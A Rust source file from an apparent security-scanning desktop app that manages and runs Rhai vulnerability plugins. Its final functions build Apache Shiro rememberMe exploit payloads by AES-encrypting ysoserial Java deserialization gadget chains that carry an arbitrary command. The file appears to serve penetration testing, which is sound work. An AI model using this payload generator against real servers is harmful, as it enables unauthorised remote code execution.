use std::path::PathBuf;
use std::sync::Arc;
use anyhow::Result;
use log::error;
use tauri::State;
use tokio::sync::Mutex;
use serde_json::Value;
use crate::handler::vuln::rhai_plugin::{VulnRhaiPluginManager, PluginContext, PluginResult};
use ysoserial_rs;
use base64::{Engine as _, engine::general_purpose};
use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
use aes::Aes128;
use uuid::Uuid;

// 定义简单的插件信息结构
#[derive(serde::Serialize)]
pub struct RhaiPluginInfo {
    pub id: String,
    pub name: String,
    pub description: String,
    pub author: String,
    pub version: String,
    pub rtype: String,
    pub severity: Option<String>,
    pub references: Option<Vec<String>>,
    pub params: Vec<ParamInfoDto>,
    pub result_fields: Vec<ResultFieldInfoDto>,
    pub is_rhai_plugin: bool,
    pub script: Option<String>,
}

// 插件参数定义传输对象
#[derive(serde::Serialize)]
pub struct ParamInfoDto {
    pub name: String,
    pub key: String,
    pub r#type: String,
    pub required: bool,
    pub default_value: Option<Value>,
    pub description: String,
    pub options: Option<Vec<Value>>,
}

// 结果字段定义传输对象
#[derive(serde::Serialize)]
pub struct ResultFieldInfoDto {
    pub name: String,
    pub key: String,
    pub r#type: String,
    pub description: String,
}

/// 共享状态
pub struct RhaiPluginManagerState {
    pub inner: Arc<Mutex<VulnRhaiPluginManager>>,
}

impl RhaiPluginManagerState {
    pub fn new(manager: VulnRhaiPluginManager) -> Self {
        Self {
            inner: Arc::new(Mutex::new(manager)),
        }
    }
}

/// 初始化Rhai插件管理器
pub async fn init_vuln_plugin_manager(plugin_dir: PathBuf) -> Result<RhaiPluginManagerState> {
    let manager = VulnRhaiPluginManager::new(plugin_dir)?;
    manager.load_all_plugins().await?;
    Ok(RhaiPluginManagerState::new(manager))
}

/// 列出所有Rhai插件
#[tauri::command]
pub async fn list_rhai_plugins(state: State<'_, RhaiPluginManagerState>) -> Result<Vec<RhaiPluginInfo>, String> {
    let manager = state.inner.lock().await;
    
    let manifests = manager.get_all_plugins().await;
    
    let plugin_infos = manifests.into_iter().map(|manifest| {
        // 转换参数
        let param_dtos = manifest.params.iter().map(|param| {
            ParamInfoDto {
                name: param.name.clone(),
                key: param.key.clone(),
                r#type: param.r#type.clone(),
                required: param.required,
                default_value: param.default.clone(),
                description: param.description.clone(),
                options: param.options.clone(),
            }
        }).collect();
        
        // 转换结果字段
        let result_field_dtos = manifest.result_fields.iter().map(|field| {
            ResultFieldInfoDto {
                name: field.name.clone(),
                key: field.key.clone(),
                r#type: field.r#type.clone(),
                description: field.description.clone(),
            }
        }).collect();
        
        // 创建插件信息对象
        RhaiPluginInfo {
            id: format!("{}:{}", manifest.rtype, manifest.name),
            name: manifest.name,
            description: manifest.description,
            author: manifest.author,
            version: manifest.version,
            rtype: manifest.rtype,
            severity: manifest.severity.clone(),
            references: manifest.references.clone(),
            params: param_dtos,
            result_fields: result_field_dtos,
            is_rhai_plugin: true,
            script: None, // 初始化不包含脚本内容，节省带宽
        }
    }).collect();
    
    Ok(plugin_infos)
}

/// 获取单个Rhai插件详情（包含脚本内容）
#[tauri::command]
pub async fn get_rhai_plugin(
    plugin_id: String,
    state: State<'_, RhaiPluginManagerState>
) -> Result<RhaiPluginInfo, String> {
    log::info!("Fetching plugin with ID: {}", plugin_id);
    
    let manager = state.inner.lock().await;
    
    // 拆分插件ID获取类型和名称
    let parts: Vec<&str> = plugin_id.split(':').collect();
    if parts.len() != 2 {
        let err_msg = format!("Invalid plugin ID format: {}, expected format 'type:name'", plugin_id);
        log::error!("{}", err_msg);
        return Err(err_msg);
    }
    
    let plugin_type = parts[0];
    let plugin_name = parts[1];
    
    log::info!("Looking for plugin type: {}, name: {}", plugin_type, plugin_name);
    
    // 列出当前加载的所有插件ID，用于调试
    let all_plugins = manager.get_all_plugins().await;
    log::info!("Currently loaded plugins ({}):", all_plugins.len());
    for plugin in &all_plugins {
        log::info!("  - {}:{}", plugin.rtype, plugin.name);
    }
    
    // 获取插件
    let manifest = match manager.get_plugin_manifest(plugin_type, plugin_name).await {
        Some(m) => m,
        None => {
            let err_msg = format!("Plugin manifest not found: {}:{}", plugin_type, plugin_name);
            log::error!("{}", err_msg);
            return Err(err_msg);
        }
    };
    
    // 获取插件脚本
    let plugin = match manager.get_plugin(&plugin_id).await {
        Some(p) => p,
        None => {
            let err_msg = format!("Plugin not found: {}", plugin_id);
            log::error!("{}", err_msg);
            return Err(err_msg);
        }
    };
    
    log::info!("Successfully found plugin {}, script length: {}", plugin_id, plugin.script().len());
    
    // 转换参数
    let param_dtos = manifest.params.iter().map(|param| {
        ParamInfoDto {
            name: param.name.clone(),
            key: param.key.clone(),
            r#type: param.r#type.clone(),
            required: param.required,
            default_value: param.default.clone(),
            description: param.description.clone(),
            options: param.options.clone(),
        }
    }).collect();
    
    // 转换结果字段
    let result_field_dtos = manifest.result_fields.iter().map(|field| {
        ResultFieldInfoDto {
            name: field.name.clone(),
            key: field.key.clone(),
            r#type: field.r#type.clone(),
            description: field.description.clone(),
        }
    }).collect();
    
    // 创建插件信息对象，包含脚本内容
    let plugin_info = RhaiPluginInfo {
        id: plugin_id.clone(),
        name: manifest.name,
        description: manifest.description,
        author: manifest.author,
        version: manifest.version,
        rtype: manifest.rtype,
        severity: manifest.severity.clone(),
        references: manifest.references.clone(),
        params: param_dtos,
        result_fields: result_field_dtos,
        is_rhai_plugin: true,
        script: Some(plugin.script().to_string()), // 包含脚本内容
    };
    
    Ok(plugin_info)
}

/// 加载所有Rhai插件
#[tauri::command]
pub async fn load_rhai_plugins(state: State<'_, RhaiPluginManagerState>) -> Result<String, String> {
    let manager = state.inner.lock().await;
    
    manager.load_all_plugins().await
        .map_err(|e| format!("加载Rhai脚本插件失败: {}", e))?;
    
    Ok("success".into())
}

/// 执行Rhai插件
#[tauri::command]
pub async fn execute_rhai_plugin(
    params: serde_json::Value,
    state: State<'_, RhaiPluginManagerState>
) -> Result<PluginResult, String> {
    let manager = state.inner.lock().await;
    
    // 从params中提取参数
    let params = params.as_object().ok_or("Invalid params format")?;
    
    let plugin_name = params.get("plugin_name")
        .and_then(|v| v.as_str())
        .ok_or("Missing plugin_name parameter")?;
    
    let plugin_type = params.get("plugin_type")
        .and_then(|v| v.as_str())
        .ok_or("Missing plugin_type parameter")?;

    let target = params.get("target")
        .and_then(|v| v.as_str())
        .ok_or("Missing target parameter")?;
    
    // 获取并记录custom_params以便调试
    log::info!("Executing plugin: {}:{} with target: {}", plugin_type, plugin_name, target);
    
    let custom_params = params.get("custom_params")
        .and_then(|v| v.as_object().cloned());
    
    // 打印完整的custom_params内容
    if let Some(cp) = custom_params.clone() {
        log::info!("Custom params: {}", serde_json::to_string(&cp).unwrap_or_default());
        
        // 特别记录proxy_url
        if let Some(proxy) = cp.get("proxy_url") {
            if let Some(proxy_str) = proxy.as_str() {
                log::info!("Found proxy_url: '{}'", proxy_str);
                if proxy_str.is_empty() {
                    log::warn!("proxy_url is empty");
                }
            } else {
                log::warn!("proxy_url is not a string: {:?}", proxy);
            }
        } else {
            log::warn!("proxy_url not found in custom_params");
        }
    } else {
        log::warn!("No custom_params provided");
    }

    let custom_params_map = custom_params
        .map(|m| m.into_iter().collect());
    
    let context = PluginContext {
        target: target.to_string(),
        custom_params: custom_params_map,
    };
    
    // 执行插件
    let mut result = manager.execute_plugin(plugin_name, plugin_type, context).await
        .map_err(|e| format!("执行Rhai脚本插件失败: {}", e))?;
    
    // 检查include_http_data参数
    let include_http_data = params.get("include_http_data")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    
    // 如果启用HTTP数据，尝试从数据中提取HTTP请求和响应信息
    if include_http_data {
        // log::info!("Extracting HTTP data for plugin result");
        
        // 如果数据中有HTTP请求信息，提取出来
        if let Some(data) = result.data.as_object() {
            // 记录对象中所有的keys，用于调试
            log::debug!("Data keys: {:?}", data.keys().map(|k| k.as_str()).collect::<Vec<&str>>());
            
            // 提取HTTP请求 - 尝试多种可能的字段名
            let request_keys = ["http_request", "request", "raw_request", "http_raw_request"];
            for key in &request_keys {
                if let Some(request) = data.get(*key) {
                    if let Some(request_str) = request.as_str() {
                        result.request = Some(request_str.to_string());
                        log::debug!("Found HTTP request in data field '{}': {} chars", key, request_str.len());
                        break;
                    } else if let Ok(request_value) = serde_json::to_string(&request) {
                        let request_len = request_value.len();
                        result.request = Some(request_value);
                        log::debug!("Found HTTP request as JSON in data field '{}': {} chars", key, request_len);
                        break;
                    }
                }
            }
            
            // 提取HTTP响应 - 尝试多种可能的字段名
            let response_keys = ["http_response", "response", "raw_response", "http_raw_response"];
            for key in &response_keys {
                if let Some(response) = data.get(*key) {
                    if let Some(response_str) = response.as_str() {
                        result.response = Some(response_str.to_string());
                        log::debug!("Found HTTP response in data field '{}': {} chars", key, response_str.len());
                        break;
                    } else if let Ok(response_value) = serde_json::to_string(&response) {
                        let response_len = response_value.len();
                        result.response = Some(response_value);
                        log::debug!("Found HTTP response as JSON in data field '{}': {} chars", key, response_len);
                        break;
                    }
                }
            }
            
            // 提取HTTP状态码 - 尝试多种可能的字段名
            let status_keys = ["http_status", "status_code", "statusCode", "status"];
            for key in &status_keys {
                if let Some(status) = data.get(*key) {
                    if let Some(status_num) = status.as_u64() {
                        result.status_code = Some(status_num as u16);
                        log::debug!("Found HTTP status code in field '{}': {}", key, status_num);
                        break;
                    } else if let Some(status_str) = status.as_str() {
                        if let Ok(status_num) = status_str.parse::<u16>() {
                            result.status_code = Some(status_num);
                            log::debug!("Found HTTP status code as string in field '{}': {}", key, status_num);
                            break;
                        }
                    }
                }
            }
            
            // 提取HTTP状态描述 - 尝试多种可能的字段名
            let status_text_keys = ["http_status_text", "status_text", "statusText", "reason"];
            for key in &status_text_keys {
                if let Some(status_text) = data.get(*key) {
                    if let Some(text) = status_text.as_str() {
                        result.status_text = Some(text.to_string());
                        log::debug!("Found HTTP status text in field '{}': {}", key, text);
                        break;
                    }
                }
            }
            
            // 提取HTTP请求方法 - 尝试多种可能的字段名
            let method_keys = ["http_method", "method", "requestMethod"];
            for key in &method_keys {
                if let Some(method) = data.get(*key) {
                    if let Some(method_str) = method.as_str() {
                        result.request_method = Some(method_str.to_string());
                        log::debug!("Found HTTP method in field '{}': {}", key, method_str);
                        break;
                    }
                }
            }
            
            // 提取HTTP请求URL - 尝试多种可能的字段名
            let url_keys = ["http_url", "url", "requestUrl", "request_url"];
            for key in &url_keys {
                if let Some(url) = data.get(*key) {
                    if let Some(url_str) = url.as_str() {
                        result.request_url = Some(url_str.to_string());
                        log::debug!("Found HTTP URL in field '{}': {}", key, url_str);
                        break;
                    }
                }
            }
            
            // 如果没有直接找到请求和响应，但存在headers和body字段，尝试构建完整HTTP请求/响应
            if result.request.is_none() {
                let mut request_parts = Vec::new();
                
                // 添加方法和URL
                if let (Some(method), Some(url)) = (
                    result.request_method.as_ref().map(|s| s.to_owned()),
                    result.request_url.as_ref().map(|s| s.to_owned())
                ) {
                    request_parts.push(format!("{} {} HTTP/1.1", method, url));
                }
                
                // 添加请求头
                if let Some(headers) = data.get("request_headers").and_then(|h| h.as_object()) {
                    for (key, value) in headers {
                        if let Some(val_str) = value.as_str() {
                            request_parts.push(format!("{}: {}", key, val_str));
                        }
                    }
                }
                
                // 添加请求体
                if let Some(body) = data.get("request_body").and_then(|b| b.as_str()) {
                    request_parts.push("".to_string()); // 空行分隔头和体
                    request_parts.push(body.to_string());
                }
                
                // 如果找到了请求部分，设置请求字段
                if !request_parts.is_empty() {
                    let full_request = request_parts.join("\r\n");
                    let request_len = full_request.len();
                    result.request = Some(full_request);
                    log::debug!("Constructed HTTP request from parts: {} chars", request_len);
                }
            }
            
            // 类似地，尝试构建响应
            if result.response.is_none() {
                let mut response_parts = Vec::new();
                
                // 添加状态行
                if let (Some(code), Some(text)) = (
                    result.status_code,
                    result.status_text.as_ref().map(|s| s.to_owned()).or(Some("OK".to_string()))
                ) {
                    response_parts.push(format!("HTTP/1.1 {} {}", code, text));
                }
                
                // 添加响应头
                if let Some(headers) = data.get("response_headers").and_then(|h| h.as_object()) {
                    for (key, value) in headers {
                        if let Some(val_str) = value.as_str() {
                            response_parts.push(format!("{}: {}", key, val_str));
                        }
                    }
                }
                
                // 添加响应体
                if let Some(body) = data.get("response_body").and_then(|b| b.as_str()) {
                    response_parts.push("".to_string()); // 空行分隔头和体
                    response_parts.push(body.to_string());
                }
                
                // 如果找到了响应部分，设置响应字段
                if !response_parts.is_empty() {
                    let full_response = response_parts.join("\r\n");
                    let response_len = full_response.len();
                    result.response = Some(full_response);
                    log::debug!("Constructed HTTP response from parts: {} chars", response_len);
                }
            }
        }
    }
    
    // 记录最终结果中是否包含HTTP数据
    log::info!("Plugin execution completed, success: {}, has request: {}, has response: {}", 
        result.success, 
        result.request.is_some(), 
        result.response.is_some()
    );
    
    Ok(result)
}

/// 上传Rhai插件
#[tauri::command]
pub async fn upload_rhai_plugin(
    script_path: String,
    state: State<'_, RhaiPluginManagerState>
) -> Result<RhaiPluginInfo, String> {
    let mut manager = state.inner.lock().await;
    
    // 检查文件是否存在
    let path = PathBuf::from(&script_path);
    if !path.exists() {
        return Err(format!("文件不存在: {}", script_path));
    }
    
    // 检查文件是否是Rhai脚本
    if path.extension().map_or(true, |ext| ext != "rhai") {
        return Err("文件不是Rhai脚本文件".to_string());
    }
    
    // 加载插件
    let plugin = manager.load_plugin(&path).await
        .map_err(|e| format!("加载Rhai脚本插件失败: {}", e))?;
    
    // 获取插件元数据
    let manifest = plugin.manifest().clone();
    
    // 转换参数
    let param_dtos = manifest.params.iter().map(|param| {
        ParamInfoDto {
            name: param.name.clone(),
            key: param.key.clone(),
            r#type: param.r#type.clone(),
            required: param.required,
            default_value: param.default.clone(),
            description: param.description.clone(),
            options: param.options.clone(),
        }
    }).collect();
    
    // 转换结果字段
    let result_field_dtos = manifest.result_fields.iter().map(|field| {
        ResultFieldInfoDto {
            name: field.name.clone(),
            key: field.key.clone(),
            r#type: field.r#type.clone(),
            description: field.description.clone(),
        }
    }).collect();
    
    // 复制插件文件到插件目录
    let plugin_dir = manager.plugin_dir().to_path_buf();
    let dest_path = plugin_dir.join(path.file_name().unwrap());
    
    if dest_path != path {
        std::fs::copy(&path, &dest_path)
            .map_err(|e| format!("复制插件文件失败: {}", e))?;
    }
    
    // 创建插件信息对象
    let plugin_info = RhaiPluginInfo {
        id: format!("{}:{}", manifest.rtype, manifest.name),
        name: manifest.name.clone(),
        description: manifest.description.clone(),
        author: manifest.author.clone(),
        rtype: manifest.rtype.clone(),
        version: manifest.version.clone(),
        severity: manifest.severity.clone(),
        references: manifest.references.clone(),
        params: param_dtos,
        result_fields: result_field_dtos,
        is_rhai_plugin: true,
        script: None, // 初始化不包含脚本内容，节省带宽
    };
    
    // 将插件添加到管理器
    manager.add_plugin(plugin).await
        .map_err(|e| format!("添加插件失败: {}", e))?;
    
    Ok(plugin_info)
}

/// 上传Rhai插件（直接通过内容）
#[tauri::command]
pub async fn upload_rhai_plugin_content(
    filename: String,
    content: String,
    state: State<'_, RhaiPluginManagerState>
) -> Result<RhaiPluginInfo, String> {
    let mut manager = state.inner.lock().await;
    
    // 获取临时目录
    let temp_dir = std::env::temp_dir();
    let temp_file_path = temp_dir.join(&filename);
    
    // 写入文件内容
    std::fs::write(&temp_file_path, content)
        .map_err(|e| format!("写入临时文件失败: {}", e))?;
    
    // 检查文件是否是Rhai脚本
    if temp_file_path.extension().map_or(true, |ext| ext != "rhai") {
        return Err("文件不是Rhai脚本文件".to_string());
    }
    
    // 加载插件
    let plugin = manager.load_plugin(&temp_file_path).await
        .map_err(|e| format!("加载Rhai脚本插件失败: {}", e))?;
    
    // 获取插件元数据
    let manifest = plugin.manifest().clone();
    
    // 转换参数
    let param_dtos = manifest.params.iter().map(|param| {
        ParamInfoDto {
            name: param.name.clone(),
            key: param.key.clone(),
            r#type: param.r#type.clone(),
            required: param.required,
            default_value: param.default.clone(),
            description: param.description.clone(),
            options: param.options.clone(),
        }
    }).collect();
    
    // 转换结果字段
    let result_field_dtos = manifest.result_fields.iter().map(|field| {
        ResultFieldInfoDto {
            name: field.name.clone(),
            key: field.key.clone(),
            r#type: field.r#type.clone(),
            description: field.description.clone(),
        }
    }).collect();
    
    // 复制插件文件到插件目录
    let plugin_dir = manager.plugin_dir().to_path_buf();
    let dest_path = plugin_dir.join(&filename);
    
    std::fs::copy(&temp_file_path, &dest_path)
        .map_err(|e| format!("复制插件文件失败: {}", e))?;
    
    // 删除临时文件
    if let Err(e) = std::fs::remove_file(&temp_file_path) {
        eprintln!("删除临时文件失败: {}", e);
    }
    
    // 创建插件信息对象
    let plugin_info = RhaiPluginInfo {
        id: format!("{}:{}", manifest.rtype, manifest.name),
        name: manifest.name.clone(),
        description: manifest.description.clone(),
        author: manifest.author.clone(),
        rtype: manifest.rtype.clone(),
        version: manifest.version.clone(),
        severity: manifest.severity.clone(),
        references: manifest.references.clone(),
        params: param_dtos,
        result_fields: result_field_dtos,
        is_rhai_plugin: true,
        script: None, // 初始化不包含脚本内容，节省带宽
    };
    
    // 将插件添加到管理器
    manager.add_plugin(plugin).await
        .map_err(|e| format!("添加插件失败: {}", e))?;
    
    Ok(plugin_info)
}

/// 删除Rhai插件
#[tauri::command]
pub async fn delete_rhai_plugin(
    plugin_name: String,
    state: State<'_, RhaiPluginManagerState>
) -> Result<bool, String> {
    let mut manager = state.inner.lock().await;
    
    // 检查插件是否存在
    let plugin = manager.get_plugin(&plugin_name).await
        .ok_or_else(|| format!("插件不存在: {}", plugin_name))?;
    
    // 删除文件
    std::fs::remove_file(plugin.path())
        .map_err(|e| format!("删除插件文件失败: {}", e))?;
    
    // 从管理器中移除插件
    manager.remove_plugin(&plugin_name).await;
    
    Ok(true)
}

/// 更新Rhai插件
#[tauri::command(rename_all = "camelCase")]
pub async fn update_rhai_plugin(
    #[allow(unused)] plugin_id: String,
    #[allow(unused)] name: String,
    #[allow(unused)] description: String,
    script: String,
    state: State<'_, RhaiPluginManagerState>
) -> Result<RhaiPluginInfo, String> {
    log::info!("Updating plugin with ID: {}", plugin_id);
    let manager_state = state.inner.lock().await;
    
    // 拆分插件ID获取类型和名称
    let parts: Vec<&str> = plugin_id.split(':').collect();
    if parts.len() != 2 {
        return Err("Invalid plugin ID format".to_string());
    }
    
    // let plugin_type = parts[0];
    // let plugin_name = parts[1];
    
    // 获取插件
    let plugin = manager_state.get_plugin(&plugin_id).await
        .ok_or_else(|| format!("Plugin not found: {}", plugin_id))?;
    
    // 获取插件文件路径
    let plugin_path = plugin.path().to_path_buf();
    
    // 把更新内容写入到文件
    std::fs::write(&plugin_path, &script)
        .map_err(|e| format!("Failed to write plugin file: {}", e))?;
    
    // 重新加载插件
    let plugin = manager_state.load_plugin(&plugin_path).await
        .map_err(|e| format!("Failed to reload plugin: {}", e))?;
    
    // 获取更新后的manifest
    let manifest = plugin.manifest();
    
    // 转换参数
    let param_dtos = manifest.params.iter().map(|param| {
        ParamInfoDto {
            name: param.name.clone(),
            key: param.key.clone(),
            r#type: param.r#type.clone(),
            required: param.required,
            default_value: param.default.clone(),
            description: param.description.clone(),
            options: param.options.clone(),
        }
    }).collect();
    
    // 转换结果字段
    let result_field_dtos = manifest.result_fields.iter().map(|field| {
        ResultFieldInfoDto {
            name: field.name.clone(),
            key: field.key.clone(),
            r#type: field.r#type.clone(),
            description: field.description.clone(),
        }
    }).collect();
    
    // 创建返回的插件信息对象
    let plugin_info = RhaiPluginInfo {
        id: plugin_id,
        name: manifest.name.clone(),
        description: manifest.description.clone(),
        author: manifest.author.clone(),
        version: manifest.version.clone(),
        rtype: manifest.rtype.clone(),
        severity: manifest.severity.clone(),
        references: manifest.references.clone(),
        params: param_dtos,
        result_fields: result_field_dtos,
        is_rhai_plugin: true,
        script: Some(script),
    };
    
    Ok(plugin_info)
}

pub fn generate_shiro_gadget_payload(key_base64: &str, gadget: &str, command: &str) -> String {
    // 1. Base64 解码密钥
    let key_bytes = match general_purpose::STANDARD.decode(key_base64) {
        Ok(k) => k,
        Err(_) => {
            error!("Invalid Base64 key");
            return "".to_string();
        } ,
    };
    if key_bytes.len() * 8 != 128 { // Shiro通常使用128位密钥
        // return Err(format!("Invalid key length: {} bytes, expected 16 bytes (128-bit)", key_bytes.len()));
    }

    let serialized_payload = match generate_ysoserial_payload(gadget, command) {
        Ok(p) => p,
        Err(e) => {
            error!("ysoserial-rs failed to generate payload: {}", e);
            return "".to_string();
        } ,
    };

    // 使用 AES-CBC 加密
    let encrypted_payload = match aes_cbc_encrypt(&serialized_payload, key_base64) {
        Ok(p) => p,
        Err(e) => {
            error!("Failed to encrypt payload: {}", e);
            return "".to_string();
        } ,
    };
    
    // 打印一些调试信息，帮助排查问题
    // println!("使用密钥: {}, 序列化 payload 长度: {}", key_base64, serialized_payload.len());
    // println!("使用 gadget: {}, 命令: {}", gadget, command);
    // println!("加密后 payload 长度: {}", encrypted_payload.len());

    // Base64 编码最终结果
    general_purpose::STANDARD.encode(&encrypted_payload)
}

// AES-CBC 加密函数
fn aes_cbc_encrypt(data: &[u8], key_b64: &str) -> Result<Vec<u8>, String> {
    // Base64 解码密钥
    let key = match general_purpose::STANDARD.decode(key_b64) {
        Ok(k) => k,
        Err(e) => return Err(format!("Invalid Base64 key: {}", e)),
    };

    // 生成随机 IV（AES 块大小为 16 字节）
    let iv = Uuid::new_v4().as_bytes()[..16].to_vec();

    // 准备密钥
    let key = GenericArray::clone_from_slice(&key[0..16]);
    let cipher = Aes128::new(&key);

    // 实现 PKCS7 填充
    let block_size = 16;
    let padding_len = block_size - (data.len() % block_size);
    let mut padded_data = data.to_vec();
    for _ in 0..padding_len {
        padded_data.push(padding_len as u8);
    }

    // 实现 CBC 模式加密
    let mut ciphertext = Vec::with_capacity(padded_data.len());
    let mut prev_block = GenericArray::clone_from_slice(&iv);

    for chunk in padded_data.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        // XOR with previous ciphertext block
        for i in 0..16 {
            block[i] ^= prev_block[i];
        }
        // Encrypt
        cipher.encrypt_block(&mut block);
        // Update previous block
        prev_block = block;
        // Add to result
        ciphertext.extend_from_slice(&block);
    }

    // 拼接 IV + ciphertext
    let mut result = iv;
    result.extend_from_slice(&ciphertext);

    Ok(result)
}

// 根据 gadget 名称调用 ysoserial-rs 中相应的函数
fn generate_ysoserial_payload(gadget: &str, command: &str) -> Result<Vec<u8>, String> {
    match gadget {
        "CommonsBeanutils1" => Ok(ysoserial_rs::get_commons_beanutils1(command)),
        "CommonsCollections1" => Ok(ysoserial_rs::get_commons_collections1(command)),
        "CommonsCollections2" => Ok(ysoserial_rs::get_commons_collections2(command)),
        "CommonsCollections3" => Ok(ysoserial_rs::get_commons_collections3(command)),
        "CommonsCollections4" => Ok(ysoserial_rs::get_commons_collections4(command)),
        "CommonsCollections5" => Ok(ysoserial_rs::get_commons_collections5(command)),
        "CommonsCollections6" => Ok(ysoserial_rs::get_commons_collections6(command)),
        "CommonsCollections7" => Ok(ysoserial_rs::get_commons_collections7(command)),
        "CommonsCollectionsK1" => Ok(ysoserial_rs::get_commons_collections_k1(command)),
        "CommonsCollectionsK2" => Ok(ysoserial_rs::get_commons_collections_k2(command)),
        "CommonsCollectionsK3" => Ok(ysoserial_rs::get_commons_collections_k3(command)),
        "CommonsCollectionsK4" => Ok(ysoserial_rs::get_commons_collections_k4(command)),
        "Clojure" => Ok(ysoserial_rs::get_clojure(command)),
        "Groovy1" => Ok(ysoserial_rs::get_groovy1(command)),
        "Hibernate1" => Ok(ysoserial_rs::get_hibernate1(command)),
        "Hibernate2" => Ok(ysoserial_rs::get_hibernate2(command)),
        "JavassistWeld1" => Ok(ysoserial_rs::get_javassist_weld1(command)),
        "JBossInterceptors1" => Ok(ysoserial_rs::get_jboss_interceptors1(command)),
        "JDK7u21" => Ok(ysoserial_rs::get_jdk7u21(command)),
        "JDK8u20" => Ok(ysoserial_rs::get_jdk8u20(command)),
        "JSON1" => Ok(ysoserial_rs::get_json1(command)),
        "MozillaRhino1" => Ok(ysoserial_rs::get_mozilla_rhino1(command)),
        "MozillaRhino2" => Ok(ysoserial_rs::get_mozilla_rhino2(command)),
        "MyFaces1" => Ok(ysoserial_rs::get_myfaces1(command)),
        "Rome" => Ok(ysoserial_rs::get_rome(command)),
        "Spring1" => Ok(ysoserial_rs::get_spring1(command)),
        "Spring2" => Ok(ysoserial_rs::get_spring2(command)),
        "C3P0" => Ok(ysoserial_rs::get_c3p0(command)),
        "Vaadin1" => Ok(ysoserial_rs::get_vaadin1(command)),
        "TomcatEcho1" => Ok(ysoserial_rs::get_cck1_tomcat_echo("shiro",command)),
        "TomcatEcho2" => Ok(ysoserial_rs::get_cck2_tomcat_echo("shiro",command)),
        "TomcatEcho3" => Ok(ysoserial_rs::get_cck1_tomcat_echo_gelen()),
        "URLDNS" => Ok(ysoserial_rs::get_url_dns(command)),
        "Test" => Ok(ysoserial_rs::get_test_payload()),
        "ShiroSimplePrincipalCollection" => {
            // 这个函数不接受命令参数
            Ok(ysoserial_rs::get_shiro_simple_principal_collection())
        },
        _ => Err(format!("不支持的 gadget: {}", gadget)),
    }
} 